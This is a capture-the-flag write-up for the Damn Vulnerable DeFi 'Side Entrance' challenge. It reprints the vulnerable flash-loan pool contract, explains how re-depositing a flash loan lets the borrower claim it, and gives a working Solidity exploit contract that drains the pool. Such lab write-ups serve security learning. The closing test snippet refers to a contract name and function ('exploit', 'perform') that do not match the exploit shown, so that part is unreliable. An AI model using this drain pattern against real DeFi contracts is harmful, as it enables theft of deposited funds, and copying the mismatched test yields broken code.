# Side Entrance

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

######

# Solution

# Challenge overview



**[official site](https://www.damnvulnerabledefi.xyz/challenges/side-entrance)**

I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Side Entrance challenge is the fourth level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool.

let’s go to the code:

**source code**
```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}
```

Okay, Let’s begin the lab has one interface, three functions that’s all


### functions :

1. `deposit()`: allows to deposit the amount as u want
2. `withdraw()`: by calling this function user will withdraw his all amount
3. `flashLoan()` : this function implements the `IFlashLoanEtherReceiver` interface and allows user to do flash transactions with the help of it.

The protocol looks simple and straight forward like: youcan not leave without returning the funds in `flashLoan` and you can not perform any reentrancy, arbitary call here too but there is a catch. This protocol never verifies if the borrowed funds came from the same transaction or from the withdraw function, it only checks whether total balance of the pool is equal after the flash loan transaction or not. That means there is a critical business logic vulnerability. Let’s try to exploit it.

### Logic :

i) Take the flashloan

ii) Return the loan through the deposit function

iii) Now, all the fund is in your control so withdraw the amount

iv) Rescue the funds( Send all of the funds to the recovery accout)

>**note:** if you want to challenge yourself this much hint is more than enough go and test your limit

## POC :

```solidity
contract Exploiterr{
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // The first step to take falsh Loan and we need to withdraw our ether to completely drain the protocol
    function Attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        (bool success,) = payable(recovery).call{value : address(this).balance}("");
        require(success, "ahh bruh ur brain also get's fucked up like mine");
    }
}
```

and u just need to call the function attack inside the `test_sideEntrance` function :

```solidity
function test_sideEntrance() public checkSolvedByPlayer {

    exploit Exploit = new exploit(pool, recovery);

    Exploit.perform();
}
```

### If you found this write up ueful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**
